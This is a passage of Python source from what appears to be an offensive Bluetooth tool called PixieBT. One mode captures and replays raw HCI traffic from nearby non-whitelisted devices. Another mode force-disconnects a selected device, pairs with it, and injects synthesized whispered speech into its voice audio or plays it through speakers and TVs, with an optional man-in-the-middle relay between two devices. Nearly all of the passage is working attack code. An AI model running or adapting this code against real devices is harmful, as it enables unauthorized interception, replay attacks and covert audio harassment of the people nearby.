                    except subprocess.TimeoutExpired:
                        proc.kill()
                        proc.wait()
                        remaining = ""
                    for line in (remaining or "").strip().split("\n"):
                        m = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line.strip())
                        if m:
                            mac = m.group(1).upper()
                            name = m.group(2).strip()
                            if name in ("(unknown)", ""):
                                name = "<unknown>"
                            if mac not in all_known and mac not in targets:
                                targets[mac] = {"name": name, "type": "ble"}
                except Exception:
                    pass
        else:
            devs = _btctl_scan(10)
            for mac, info in devs.items():
                if mac not in all_known:
                    targets[mac] = info
        return targets

    def _capture_traffic(target_mac, duration):
        """Capture raw HCI traffic for a given duration.
        Returns path to capture file or None."""
        cap_file = os.path.join(
            capture_dir,
            "cap_{}_{}.bin".format(
                target_mac.replace(":", ""),
                int(time.time()),
            ),
        )
        try:
            if has_btmon:
                proc = subprocess.Popen(
                    ["btmon", "-i", iface, "-w", cap_file],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
            else:
                proc = subprocess.Popen(
                    ["hcidump", "-i", iface, "-w", cap_file],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
            time.sleep(duration)
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

            if os.path.isfile(cap_file) and os.path.getsize(cap_file) > 0:
                return cap_file
            return None
        except FileNotFoundError:
            return None
        except Exception as e:
            print(colored("    [!] Capture error: {}".format(e), "red"))
            return None

    def _parse_hci_packets(raw_data):
        """Parse raw btsnoop/HCI dump into individual packets.
        Returns list of (pkt_type_byte, payload_bytes) tuples.
        Supports btsnoop format (btmon -w) and raw HCI (hcidump -w)."""
        packets = []
        offset = 0
        data_len = len(raw_data)

        # Try btsnoop format: 16-byte header "btsnoop\x00" + version + type
        if data_len >= 16 and raw_data[:8] == b'btsnoop\x00':
            offset = 16  # skip btsnoop header
            while offset + 24 <= data_len:
                # btsnoop record: 4 fields of 4 bytes each = header,
                # then 8 bytes timestamp = 24 bytes record header
                try:
                    orig_len, incl_len, flags, drops = struct.unpack_from(
                        '>IIII', raw_data, offset)
                    ts_hi, ts_lo = struct.unpack_from('>II', raw_data, offset + 16)
                    offset += 24
                    if incl_len > data_len - offset or incl_len > 65535:
                        break
                    pkt_data = raw_data[offset:offset + incl_len]
                    offset += incl_len
                    if len(pkt_data) >= 1:
                        packets.append((pkt_data[0:1], pkt_data[1:]))
                except struct.error:
                    break
        else:
            # Raw HCI dump: each record = 1-byte type + length-dependent payload
            while offset + 1 < data_len:
                pkt_type = raw_data[offset:offset + 1]
                offset += 1
                ptype = pkt_type[0]

                if ptype == 0x02:  # ACL data
                    if offset + 4 > data_len:
                        break
                    _handle, dlen = struct.unpack_from('<HH', raw_data, offset)
                    total = 4 + dlen
                    if offset + total > data_len:
                        break
                    packets.append((pkt_type, raw_data[offset:offset + total]))
                    offset += total
                elif ptype == 0x01:  # HCI command
                    if offset + 3 > data_len:
                        break
                    _opcode, plen = struct.unpack_from('<HB', raw_data, offset)
                    total = 3 + plen
                    if offset + total > data_len:
                        break
                    packets.append((pkt_type, raw_data[offset:offset + total]))
                    offset += total
                elif ptype == 0x04:  # HCI event
                    if offset + 2 > data_len:
                        break
                    _evt, plen = struct.unpack_from('<BB', raw_data, offset)
                    total = 2 + plen
                    if offset + total > data_len:
                        break
                    packets.append((pkt_type, raw_data[offset:offset + total]))
                    offset += total
                elif ptype == 0x05:  # SCO data
                    if offset + 3 > data_len:
                        break
                    _handle, slen = struct.unpack_from('<HB', raw_data, offset)
                    total = 3 + slen
                    if offset + total > data_len:
                        break
                    packets.append((pkt_type, raw_data[offset:offset + total]))
                    offset += total
                else:
                    break  # unknown type, stop parsing

        return packets

    def _increment_seq(payload, seq_offset):
        """Increment ACL sequence numbers in payload.
        For ACL packets, modifies the packet boundary flags / broadcast flags
        to simulate a new sequence."""
        if len(payload) < 4:
            return payload
        ba = bytearray(payload)
        # ACL header: handle(12 bits) + PB(2 bits) + BC(2 bits) + dlen(16 bits)
        # We increment the handle's connection seq by modifying bytes after
        # the L2CAP header if present
        # L2CAP header starts at offset 4: length(2) + CID(2)
        if len(ba) >= 8:
            # Modify L2CAP signaling ID if present (offset 9 in many packets)
            if len(ba) > 9:
                ba[9] = (ba[9] + seq_offset) & 0xFF
        return bytes(ba)

    def _replay_traffic(cap_file, target_mac, count):
        """Replay captured traffic with incrementing sequence numbers.
        Sends 1 replay per second via raw HCI socket."""
        # Read and parse the capture file
        try:
            with open(cap_file, 'rb') as f:
                raw_data = f.read()
        except Exception as e:
            print(colored("    [!] Cannot read capture: {}".format(e), "red"))
            return 0

        packets = _parse_hci_packets(raw_data)
        if not packets:
            print(colored("    [!] No parseable HCI packets in capture.", "red"))
            return 0

        print(colored(
            "    [*] Parsed {} HCI packet(s), replaying with seq increment ...".format(
                len(packets)), "white"))

        # Open raw HCI socket
        hci_sock = None
        hci_dev = int(iface.replace("hci", "")) if iface.startswith("hci") else 0
        try:
            # HCI channel raw: AF_BLUETOOTH=31, BTPROTO_HCI=1
            hci_sock = socket.socket(31, socket.SOCK_RAW, 1)
            hci_sock.bind((hci_dev,))
        except (OSError, PermissionError) as e:
            print(colored(
                "    [!] Cannot open raw HCI socket: {}".format(e), "red"))
            print(colored(
                "    [!] Make sure you run as root (sudo) and {} exists.".format(iface), "red"))
            return 0

        replayed = 0
        try:
            for iteration in range(count):
                if stop_event.is_set():
                    break
                t_start = time.time()
                seq_offset = iteration + 1
                for pkt_type, payload in packets:
                    if stop_event.is_set():
                        break
                    ptype = pkt_type[0]
                    # Only replay outgoing ACL data (type 0x02)
                    if ptype == 0x02:
                        modified = _increment_seq(payload, seq_offset)
                        try:
                            hci_sock.send(pkt_type + modified)
                        except OSError:
                            pass
                replayed += 1
                # Pace: 1 replay per second
                elapsed = time.time() - t_start
                if elapsed < 1.0 and not stop_event.is_set():
                    stop_event.wait(1.0 - elapsed)
        finally:
            hci_sock.close()

        return replayed

    # ── Main loop ──
    cycle = 0
    while not stop_event.is_set():
        cycle += 1
        print(colored("\n[─] Scan cycle {} ...".format(cycle), "cyan", attrs=["bold"]))

        targets = _discover_targets()
        if not targets:
            print(colored("    [*] No non-whitelisted devices found.", "green"))
            stop_event.wait(15)
            continue

        print(colored(
            "    [*] {} non-whitelisted device(s) found:".format(len(targets)),
            "yellow", attrs=["bold"]))
        for mac, info in sorted(targets.items()):
            print(colored("        {} ({}) [{}]".format(
                mac, info["name"], info["type"]), "yellow"))

        for target_mac, info in targets.items():
            if stop_event.is_set():
                break

            print(colored(
                "\n  [▶] TARGET: {} ({})".format(target_mac, info["name"]),
                "red", attrs=["bold"]))

            # Step 1: Capture
            print(colored(
                "    [*] Capturing {} s of traffic ...".format(capture_duration),
                "white"))
            cap_file = _capture_traffic(target_mac, capture_duration)

            if not cap_file:
                print(colored("    [!] No traffic captured, skipping.", "yellow"))
                continue

            cap_size = os.path.getsize(cap_file)
            stats["captures"] += 1
            stats["targets"].add(target_mac)
            print(colored(
                "    [+] Captured {} bytes → {}".format(cap_size, cap_file),
                "green"))

            # Step 2: Replay
            print(colored(
                "    [*] Replaying {}x ...".format(replay_count),
                "white"))
            replayed = _replay_traffic(cap_file, target_mac, replay_count)
            stats["replays"] += replayed
            print(colored(
                "    [+] Replayed {}/{} times".format(replayed, replay_count),
                "green" if replayed == replay_count else "yellow"))

        # Summary
        print(colored(
            "\n[*] Cycle {} complete — {} capture(s), {} replay(s), {} target(s)".format(
                cycle, stats["captures"], stats["replays"], len(stats["targets"])),
            "cyan"))

        stop_event.wait(15)

    # Cleanup
    print(colored("[*] PixieBT mode 3 stopped.", "yellow"))
    print(colored("[*] Captures saved in: {}".format(capture_dir), "cyan"))


# ──────────────────────────────────────────────
#  Mode 4 : Audio MITM — Whisper Injection
# ──────────────────────────────────────────────

def _generate_whispers_from_text(text_file, output_dir=None, lang="en"):
    """Generate whispered .wav files from a text file using espeak/espeak-ng.

    Each non-empty line in the text file produces one WAV file.
    Uses espeak's +whisper voice variant for a natural whispered sound.
    Returns the output directory path containing the generated files.
    """

    if not os.path.isfile(text_file):
        print(colored("[!] Text file not found: {}".format(text_file), "red"))
        sys.exit(1)

    # Find espeak binary
    espeak_bin = None
    for candidate in ["espeak-ng", "espeak"]:
        if shutil.which(candidate):
            espeak_bin = candidate
            break
    if not espeak_bin:
        print(colored("[!] espeak / espeak-ng not found.", "red"))
        print(colored("[!] Install with: sudo apt install espeak-ng", "red"))
        sys.exit(1)

    # Read words/phrases (one per line)
    with open(text_file, "r", encoding="utf-8") as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    if not lines:
        print(colored("[!] Text file is empty: {}".format(text_file), "red"))
        sys.exit(1)

    # Create output directory
    if not output_dir:
        output_dir = tempfile.mkdtemp(prefix="pixiebt_whispers_")
    else:
        os.makedirs(output_dir, exist_ok=True)

    print(colored("[*] Generating {} whisper file(s) with {} ...".format(
        len(lines), espeak_bin), "cyan"))

    generated = 0
    for i, phrase in enumerate(lines, 1):
        # Sanitize filename: keep only alphanumeric, replace rest with _
        safe = re.sub(r'[^a-zA-Z0-9]', '_', phrase)[:40].strip('_')
        if not safe:
            safe = "whisper_{}".format(i)
        wav_path = os.path.join(output_dir, "{:03d}_{}.wav".format(i, safe))

        # espeak -v <lang>+whisper -s <speed> -w <output> "<text>"
        # Speed 130 = slightly slow for a creepy whisper effect
        cmd = [
            espeak_bin,
            "-v", "{}+whisper".format(lang),
            "-s", "130",
            "-p", "35",   # lower pitch
            "-w", wav_path,
            phrase,
        ]
        try:
            ret = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            if ret.returncode == 0 and os.path.isfile(wav_path):
                generated += 1
                print(colored("    [+] {:03d} — {!r}".format(i, phrase), "green"))
            else:
                # Retry without +whisper variant (some espeak versions)
                cmd[2] = lang
                ret2 = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
                if ret2.returncode == 0 and os.path.isfile(wav_path):
                    generated += 1
                    print(colored("    [+] {:03d} — {!r} (no whisper voice)".format(i, phrase), "yellow"))
                else:
                    print(colored("    [!] {:03d} — {!r}: generation failed".format(i, phrase), "red"))
        except Exception as e:
            print(colored("    [!] {:03d} — {!r}: {}".format(i, phrase, e), "red"))

    if generated == 0:
        print(colored("[!] No WAV files could be generated.", "red"))
        sys.exit(1)

    print(colored("[+] Generated {} file(s) in {}".format(generated, output_dir), "green"))
    return output_dir


def mode_whisper(iface, iface2, whispers_dir, whisper_volume=0.15, include_ble=True,
                 whispers_text=None, whisper_lang="en"):
    """Inject whispered voices into Bluetooth audio (SCO or A2DP).

    Steps:
      1. Load whisper .wav files (or generate from text via espeak)
      2. Discover all available Bluetooth devices
      3. User selects target(s): 1 target (direct) or 2 targets (MITM)
      4. Force-disconnect target(s)
      5. Pair & connect via SCO (voice) or A2DP fallback (TV/speakers)
      6. Inject whispers / relay audio with injection
    """

    if not iface2:
        print(colored("[*] No -o: single-target injection mode only.", "yellow"))
        print(colored("[*] For MITM relay (2 targets), use -o hci1.", "yellow"))

    stop_event = threading.Event()

    def _on_sigint(sig, frame):
        print(colored("\n[*] Stopping ...", "yellow"))
        stop_event.set()

    signal.signal(signal.SIGINT, _on_sigint)

    # ── Load whisper .wav files ──
    def _load_whispers():
        whispers = []
        if not whispers_dir or not os.path.isdir(whispers_dir):
            print(colored("[!] Whispers directory not found: {}".format(whispers_dir), "red"))
            return whispers
        for fname in sorted(os.listdir(whispers_dir)):
            if not fname.lower().endswith('.wav'):
                continue
            fpath = os.path.join(whispers_dir, fname)
            try:
                with wave.open(fpath, 'rb') as wf:
                    n_ch = wf.getnchannels()
                    sw = wf.getsampwidth()
                    rate = wf.getframerate()
                    raw = wf.readframes(wf.getnframes())

                # Convert to 16-bit signed
                if sw == 1:
                    samples = array.array('h', [(b - 128) * 256 for b in raw])
                elif sw == 2:
                    samples = array.array('h')
                    samples.frombytes(raw)
                elif sw == 4:
                    vals = struct.unpack('<' + 'i' * (len(raw) // 4), raw)
                    samples = array.array('h', [max(-32768, min(32767, v >> 16)) for v in vals])
                else:
                    continue

                # Stereo → mono
                if n_ch >= 2:
                    samples = array.array('h', [
                        (samples[i] + samples[i + 1]) // 2
                        for i in range(0, len(samples) - 1, 2)
                    ])

                # Resample to SCO_SAMPLE_RATE (8kHz) if needed
                if rate != SCO_SAMPLE_RATE:
                    ratio = SCO_SAMPLE_RATE / rate
                    new_len = max(1, int(len(samples) * ratio))
                    resampled = array.array('h', [0] * new_len)
                    for i in range(new_len):
                        src = i / ratio
                        idx = int(src)
                        frac = src - idx
                        if idx + 1 < len(samples):
                            val = int(samples[idx] * (1 - frac) + samples[idx + 1] * frac)
                        else:
                            val = samples[min(idx, len(samples) - 1)]
                        resampled[i] = max(-32768, min(32767, val))
                    samples = resampled

                whispers.append({"name": fname, "pcm": samples})
                print(colored("    [+] {}: {} samples ({:.1f}s)".format(
                    fname, len(samples), len(samples) / SCO_SAMPLE_RATE), "green"))
            except Exception as e:
                print(colored("    [!] {}: {}".format(fname, e), "yellow"))
        return whispers

    # ── Audio analysis ──
    def _pcm_rms(samples):
        """RMS energy of int16 PCM samples."""
        if not samples:
            return 0.0
        return (sum(s * s for s in samples) / len(samples)) ** 0.5

    def _pcm_zcr(samples):
        """Zero-crossing rate."""
        if len(samples) < 2:
            return 0.0
        return sum(
            1 for i in range(1, len(samples))
            if (samples[i] >= 0) != (samples[i - 1] >= 0)
        ) / (len(samples) - 1)

    def _detect_multi_source(buf):
        """Detect multiple simultaneous ambient sound sources.
        Uses 3 heuristics: energy floor, zero-crossing band, energy variance."""
        if len(buf) < WHISPER_DETECT_WINDOW // 2:
            return False
        rms = _pcm_rms(buf)
        if rms < ENERGY_THRESHOLD:
            return False  # silence
        zcr = _pcm_zcr(buf)
        if zcr < ZCR_LOW or zcr > ZCR_HIGH:
            return False  # pure tone or pure noise (single source)
        # Energy variance across 4 sub-windows
        cs = len(buf) // 4
        energies = [_pcm_rms(buf[i * cs:(i + 1) * cs]) for i in range(4)]
        mean_e = sum(energies) / 4
        if mean_e < 1:
            return False
        var = sum((e - mean_e) ** 2 for e in energies) / 4
        cv = (var ** 0.5) / mean_e  # coefficient of variation
        return cv > CV_THRESHOLD

    # ── Audio mixing ──
    def _mix_pcm(original, whisper_pcm, w_pos, volume, n_samples):
        """Mix whisper into original PCM. Returns (bytes, new_whisper_pos)."""
        mixed = array.array('h', [0] * n_samples)
        w_len = len(whisper_pcm)
        for i in range(n_samples):
            o = original[i] if i < len(original) else 0
            w = int(whisper_pcm[(w_pos + i) % w_len] * volume)
            mixed[i] = max(-32768, min(32767, o + w))
        return mixed.tobytes(), (w_pos + n_samples) % w_len

    # ── Bluetooth helpers ──
    def _pair_device(target_mac):
        """Pair with target using bluetoothctl (trust + pair)."""
        print(colored("    [*] Pairing {} ...".format(target_mac), "white"))
        try:
            for cmd in ["trust", "pair"]:
                subprocess.run(
                    ["bluetoothctl", cmd, target_mac],
                    capture_output=True, text=True, timeout=15,
                    input="yes\n",
                )
            print(colored("    [+] Paired with {}".format(target_mac), "green"))
            return True
        except Exception as e:
            print(colored("    [!] Pairing error: {}".format(e), "red"))
            return False

    def _disconnect_target(mac):
        """Force disconnect a device."""
        try:
            subprocess.run(
                ["bluetoothctl", "disconnect", mac],
                capture_output=True, timeout=5,
            )
        except Exception:
            pass

    def _sco_connect(adapter_mac, target_mac):
        """Open SCO socket to target. Returns socket or None."""
        try:
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_SCO)
            sock.bind((adapter_mac,))
            sock.settimeout(10)
            sock.connect((target_mac,))
            sock.settimeout(1.0)
            return sock
        except OSError as e:
            print(colored(
                "    [!] SCO connection to {} failed: {}".format(target_mac, e), "red"))
            print(colored(
                "    [!] Make sure the device is paired and supports voice audio.", "red"))
            return None

    # ── Relay thread ──
    def _relay_thread(src_sock, dst_sock, direction, whispers, stats):
        """Relay SCO audio from src to dst with whisper injection."""
        w_idx = 0
        w_pos = 0
        pcm_buf = array.array('h')

        while not stop_event.is_set():
            try:
                data = src_sock.recv(SCO_PKT_SIZE * 2)
                if not data:
                    break
            except socket.timeout:
                continue
            except OSError:
                break

            n_samples = len(data) // SCO_SAMPLE_WIDTH
            if n_samples == 0:
                try:
                    dst_sock.send(data)
                except OSError:
                    break
                continue

            # Decode to PCM samples
            samples = array.array('h')
            samples.frombytes(data[:n_samples * SCO_SAMPLE_WIDTH])

            # Accumulate buffer for multi-source detection
            pcm_buf.extend(samples)
            if len(pcm_buf) > WHISPER_DETECT_WINDOW:
                pcm_buf = pcm_buf[-WHISPER_DETECT_WINDOW:]

            # Check for multi-source and inject if detected
            inject = False
            if whispers and len(pcm_buf) >= WHISPER_DETECT_WINDOW // 2:
                if _detect_multi_source(pcm_buf):
                    inject = True

            if inject:
                w = whispers[w_idx]
                out_data, w_pos = _mix_pcm(
                    samples, w["pcm"], w_pos, whisper_volume, n_samples)
                stats["injections"] += 1
                # Cycle through whisper files every 50 injections
                if stats["injections"] % 50 == 0:
                    w_idx = (w_idx + 1) % len(whispers)
            else:
                out_data = data

            try:
                dst_sock.send(out_data)
            except OSError:
                break
            stats["relayed"] += 1

        stats["stopped"] = True

    # ── Inject thread (single-target) ──
    def _inject_thread(sock, whispers, stats):
        """Listen on SCO socket and inject whisper audio back into the same device."""
        w_idx = 0
        w_pos = 0
        pcm_buf = array.array('h')

        while not stop_event.is_set():
            try:
                data = sock.recv(SCO_PKT_SIZE * 2)
                if not data:
                    break
            except socket.timeout:
                continue
            except OSError:
                break

            n_samples = len(data) // SCO_SAMPLE_WIDTH
            if n_samples == 0:
                continue

            # Decode incoming audio
            samples = array.array('h')
            samples.frombytes(data[:n_samples * SCO_SAMPLE_WIDTH])

            # Accumulate buffer for detection
            pcm_buf.extend(samples)
            if len(pcm_buf) > WHISPER_DETECT_WINDOW:
                pcm_buf = pcm_buf[-WHISPER_DETECT_WINDOW:]

            # Detect multi-source and inject if triggered
            inject = False
            if whispers and len(pcm_buf) >= WHISPER_DETECT_WINDOW // 2:
                if _detect_multi_source(pcm_buf):
                    inject = True

            if inject:
                w = whispers[w_idx]
                out_data, w_pos = _mix_pcm(
                    samples, w["pcm"], w_pos, whisper_volume, n_samples)
                stats["injections"] += 1
                if stats["injections"] % 50 == 0:
                    w_idx = (w_idx + 1) % len(whispers)
            else:
                out_data = data

            try:
                sock.send(out_data)
            except OSError:
                break
            stats["relayed"] += 1

        stats["stopped"] = True

    # ── A2DP sink playback thread ──
    def _a2dp_playback_thread(mac, whispers, stats):
        """Play whisper WAVs to an A2DP sink (TV, speaker, headphones) via paplay/pw-play.
        Plays whispers periodically with pauses between them."""
        # Find PulseAudio/PipeWire sink for this device
        sink_name = None
        mac_part = mac.replace(":", "_")

        # Detect audio system
        play_cmd = None
        for candidate in ["pw-play", "paplay", "aplay"]:
            if shutil.which(candidate):
                play_cmd = candidate
                break

        if not play_cmd:
            print(colored("[!] No audio player found (pw-play/paplay/aplay).", "red"))
            stats["stopped"] = True
            return

        # For PulseAudio/PipeWire: find the sink matching the BT MAC
        if play_cmd in ("pw-play", "paplay"):
            try:
                ret = subprocess.run(
                    ["pactl", "list", "short", "sinks"],
                    capture_output=True, text=True, timeout=5,
                )
                for line in ret.stdout.strip().split("\n"):
                    if mac_part in line:
                        sink_name = line.split("\t")[1] if "\t" in line else line.split()[1]
                        break
            except Exception:
                pass
            if not sink_name:
                # Also try PipeWire style
                try:
                    ret = subprocess.run(
                        ["pactl", "list", "sinks"],
                        capture_output=True, text=True, timeout=5,
                    )
                    for line in ret.stdout.strip().split("\n"):
                        if mac_part in line or mac.replace(":", "-") in line:
                            # Extract sink name from previous "Name:" line
                            pass
                    # Fallback: use bluez_sink.<mac>
                    sink_name = "bluez_sink.{}".format(mac_part)
                except Exception:
                    sink_name = "bluez_sink.{}".format(mac_part)

        print(colored("    [*] Audio player : {}".format(play_cmd), "cyan"))
        if sink_name:
            print(colored("    [*] Sink target  : {}".format(sink_name), "cyan"))

        # Write whisper PCM to temporary WAV files for playback
        tmp_wavs = []
        tmp_dir = tempfile.mkdtemp(prefix="pixiebt_a2dp_")
        for i, w in enumerate(whispers):
            wav_path = os.path.join(tmp_dir, "{:03d}.wav".format(i))
            try:
                with wave.open(wav_path, 'wb') as wf:
                    wf.setnchannels(1)
                    wf.setsampwidth(SCO_SAMPLE_WIDTH)
                    wf.setframerate(SCO_SAMPLE_RATE)
                    wf.writeframes(w["pcm"].tobytes())
                tmp_wavs.append(wav_path)
            except Exception:
                pass

        if not tmp_wavs:
            print(colored("[!] Cannot create temp WAV files.", "red"))
            stats["stopped"] = True
            return

        w_idx = 0
        while not stop_event.is_set():
            wav_path = tmp_wavs[w_idx % len(tmp_wavs)]
            cmd = [play_cmd]
            if play_cmd == "paplay" and sink_name:
                cmd.extend(["--device", sink_name])
            elif play_cmd == "pw-play" and sink_name:
                cmd.extend(["--target", sink_name])
            cmd.append(wav_path)

            try:
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                # Wait for playback to finish or stop signal
                while proc.poll() is None and not stop_event.is_set():
                    time.sleep(0.2)
                if stop_event.is_set():
                    proc.terminate()
                    break
                stats["injections"] += 1
                w_idx += 1
            except Exception as e:
                print(colored("    [!] Playback error: {}".format(e), "red"))
                break

            # Pause between whispers (3-8 seconds, varies)
            pause = 3.0 + (w_idx % 6)
            for _ in range(int(pause * 5)):
                if stop_event.is_set():
                    break
                time.sleep(0.2)

        # Cleanup temp files
        for f in tmp_wavs:
            try:
                os.unlink(f)
            except Exception:
                pass
        try:
            os.rmdir(tmp_dir)
        except Exception:
            pass
        stats["stopped"] = True

    # ── A2DP connect helper ──
    def _a2dp_connect(mac):
        """Connect to a device via A2DP profile using bluetoothctl.
        Returns True if the device appears as an audio sink."""
        try:
            subprocess.run(
                ["bluetoothctl", "connect", mac],
                capture_output=True, text=True, timeout=15,
                input="yes\n",
            )
            time.sleep(2)
            # Check if a PulseAudio/PipeWire sink appeared
            mac_part = mac.replace(":", "_")
            ret = subprocess.run(
                ["pactl", "list", "short", "sinks"],
                capture_output=True, text=True, timeout=5,
            )
            for line in ret.stdout.strip().split("\n"):
                if mac_part in line or mac.replace(":", "-") in line:
                    return True
            # Even if not found in pactl, the connection may work
            return True
        except Exception:
            return False

    # ═══════════════════════════════════════════
    #  MAIN FLOW
    # ═══════════════════════════════════════════

    print(colored("[+] Mode 4 — Audio MITM: Whisper Injection", "cyan", attrs=["bold"]))
    print(colored("[*] Adapter 1    : {}".format(iface), "cyan"))
    print(colored("[*] Adapter 2    : {}".format(iface2), "cyan"))
    print(colored("[*] Whisper vol  : {:.0%}".format(whisper_volume), "cyan"))
    print()

    # Step 0: Generate WAV from text file (auto-fallback to default)
    if not whispers_text and not whispers_dir:
        # No explicit source — use default text file
        whispers_text = WHISPERS_TEXT_FILE
        print(colored("[*] No --whispers-dir or -f specified", "yellow"))
        print(colored("[*] Using default: {}".format(WHISPERS_TEXT_FILE), "yellow"))
    if whispers_text:
        whispers_dir = _generate_whispers_from_text(whispers_text, whispers_dir, lang=whisper_lang)
        print()

    print(colored("[*] Whispers dir : {}".format(whispers_dir), "cyan"))
    print()

    # Step 1: Load whispers
    print(colored("[*] Loading whisper files ...", "cyan"))
    whispers = _load_whispers()
    if not whispers:
        print(colored("[!] No .wav files found in {}".format(whispers_dir), "red"))
        if not whispers_text:
            print(colored("[*] Tip: use -f words.txt to generate from text", "yellow"))
        sys.exit(1)
    print(colored("[+] Loaded {} whisper file(s)\n".format(len(whispers)), "green"))

    # Step 2: Discover all available Bluetooth devices
    has_hcitool = shutil.which("hcitool") is not None
    print(colored("[*] Scanning for available Bluetooth devices ...", "cyan"))
    targets = {}
    if has_hcitool:
        try:
            ret = subprocess.run(
                ["hcitool", "-i", iface, "scan", "--flush", "--length", "6"],
                capture_output=True, text=True, timeout=20,
            )
            for line in ret.stdout.strip().split("\n"):
                m = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line.strip())
                if m:
                    mac = m.group(1).upper()
                    name = m.group(2).strip() or "<unknown>"
                    targets[mac] = {"name": name, "type": "classic"}
        except Exception:
            pass
        if include_ble:
            try:
                proc = subprocess.Popen(
                    ["hcitool", "-i", iface, "lescan", "--duplicates"],
                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
                )
                time.sleep(8)
                proc.terminate()
                try:
                    rem, _ = proc.communicate(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
                    rem = ""
                for line in (rem or "").strip().split("\n"):
                    m = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line.strip())
                    if m:
                        mac = m.group(1).upper()
                        name = m.group(2).strip()
                        if name in ("(unknown)", ""):
                            name = "<unknown>"
                        if mac not in targets:
                            targets[mac] = {"name": name, "type": "ble"}
            except Exception:
                pass
    else:
        devs = _btctl_scan(10)
        for mac, info in devs.items():
            targets[mac] = info

    if len(targets) < 1:
        print(colored("[!] No Bluetooth devices found.", "red"))
        sys.exit(1)

    # Step 3: User selects target(s)
    sorted_targets = sorted(targets.items())
    print(colored("\n  Available devices:", "yellow", attrs=["bold"]))
    print("   #   MAC                 NAME                         TYPE")
    print("   " + "-" * 63)
    for i, (mac, info) in enumerate(sorted_targets, 1):
        print("   {}   {}   {:28s} {}".format(i, mac, info["name"], info["type"]))

    dual_mode = iface2 is not None

    if dual_mode:
        print(colored("\n  [1 target]  Direct injection (whisper sent to device)", "cyan"))
        print(colored("  [2 targets] MITM relay (intercept audio between A ↔ B)", "cyan"))
        print()
        try:
            sel = input(colored("[?] Select target(s) — comma-separated (e.g. 1 or 1,2): ", "cyan")).strip()
            indices = [int(x.strip()) - 1 for x in sel.split(",")]
        except (ValueError, EOFError):
            print(colored("[!] Invalid selection.", "red"))
            sys.exit(1)
    else:
        # Single adapter → single target only
        print()
        try:
            sel = input(colored("[?] Select target (number): ", "cyan")).strip()
            indices = [int(sel) - 1]
        except (ValueError, EOFError):
            print(colored("[!] Invalid selection.", "red"))
            sys.exit(1)

    for idx in indices:
        if not (0 <= idx < len(sorted_targets)):
            print(colored("[!] Invalid selection: {}".format(idx + 1), "red"))
            sys.exit(1)
    if len(indices) == 2 and indices[0] == indices[1]:
        print(colored("[!] Device A and B must be different.", "red"))
        sys.exit(1)
    if len(indices) > 2:
        print(colored("[!] Select 1 or 2 targets maximum.", "red"))
        sys.exit(1)

    # ─── Single-target mode ────────────────────
    if len(indices) == 1:
        mac_t, info_t = sorted_targets[indices[0]]
        print(colored("\n[*] Target: {} ({})".format(mac_t, info_t["name"]), "yellow"))

        adapter_mac = _get_controller_mac(iface)
        if not adapter_mac:
            print(colored("[!] Cannot read adapter MAC from sysfs.", "red"))
            sys.exit(1)

        print(colored("\n[*] Disconnecting target ...", "cyan"))
        _disconnect_target(mac_t)
        time.sleep(1)

        print(colored("[*] Pairing with target ...", "cyan"))
        if not _pair_device(mac_t):
            print(colored("[!] Cannot pair. Aborting.", "red"))
            sys.exit(1)
        time.sleep(1)

        # Try SCO first (voice devices), fallback to A2DP (TV, speakers, headphones)
        use_a2dp = False
        print(colored("[*] Trying SCO connection (voice profile) ...", "cyan"))
        sock_t = _sco_connect(adapter_mac, mac_t)

        if sock_t:
            print(colored("    [+] SCO → {} ({})".format(mac_t, info_t["name"]), "green"))
            print(colored("[*] Mode  : SCO direct injection", "yellow"))
            print(colored(
                "\n[+] Direct injection active — whispers sent on multi-source detection",
                "green", attrs=["bold"]))
            print(colored("[*] Press Ctrl+C to stop\n", "cyan"))

            stats_inj = {"relayed": 0, "injections": 0, "stopped": False}
            t_inj = threading.Thread(
                target=_inject_thread,
                args=(sock_t, whispers, stats_inj),
                daemon=True,
            )
            t_inj.start()

            while not stop_event.is_set():
                time.sleep(10)
                if stop_event.is_set():
                    break
                color = "green" if stats_inj["injections"] == 0 else "magenta"
                print(colored(
                    "[*] Packets: {} | Injections: {}".format(
                        stats_inj["relayed"], stats_inj["injections"]),
                    color))
                if stats_inj["stopped"]:
                    print(colored("[!] Injection thread stopped.", "red"))
                    break

            stop_event.set()
            sock_t.close()
            t_inj.join(timeout=5)
            print(colored("[*] PixieBT mode 4 stopped.", "yellow"))
            print(colored("[*] Total: {} pkt(s), {} whisper injection(s)".format(
                stats_inj["relayed"], stats_inj["injections"]), "cyan"))
        else:
            # SCO failed → A2DP fallback (TV, speakers, headphones)
            print(colored(
                "[*] SCO not available — switching to A2DP sink mode (TV/speaker/headphones)",
                "yellow"))
            print(colored("[*] Connecting via A2DP ...", "cyan"))

            if not _a2dp_connect(mac_t):
                print(colored("[!] A2DP connection failed.", "red"))
                sys.exit(1)
            print(colored("    [+] A2DP → {} ({})".format(mac_t, info_t["name"]), "green"))
            print(colored("[*] Mode  : A2DP playback (whispers played on device)", "yellow"))
            print(colored(
                "\n[+] A2DP injection active — whispers played directly on target",
                "green", attrs=["bold"]))
            print(colored("[*] Press Ctrl+C to stop\n", "cyan"))

            stats_inj = {"relayed": 0, "injections": 0, "stopped": False}
            t_play = threading.Thread(
                target=_a2dp_playback_thread,
                args=(mac_t, whispers, stats_inj),
                daemon=True,
            )
            t_play.start()

            while not stop_event.is_set():
                time.sleep(10)
                if stop_event.is_set():
                    break
                color = "green" if stats_inj["injections"] == 0 else "magenta"
                print(colored(
                    "[*] Whispers played: {}".format(stats_inj["injections"]),
                    color))
                if stats_inj["stopped"]:
                    print(colored("[!] Playback thread stopped.", "red"))
                    break

            stop_event.set()
            _disconnect_target(mac_t)
            t_play.join(timeout=5)
            print(colored("[*] PixieBT mode 4 stopped.", "yellow"))
